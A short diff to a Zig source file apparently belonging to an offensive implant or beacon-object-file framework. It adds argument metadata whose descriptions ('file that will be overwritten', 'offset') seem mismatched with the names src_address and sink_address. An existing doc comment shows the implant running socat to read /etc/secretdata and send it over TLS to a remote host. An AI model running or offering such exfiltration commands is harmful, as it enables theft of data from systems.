@@ -27,6 +27,15 @@
 ///
 /// In the implant:
 ///   z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443
+///arguments:
+///- name: src_address
+///  desc: "path to a file that will be overwritten"
+///  type: string
+///  required: true
+///- name: sink_address
+///  desc: "offset in overwritten file"
+///  type: string
+///  required: true
 const std = @import("std");
 const posix = @import("std").posix;
 const bofapi = @import("bof_api");
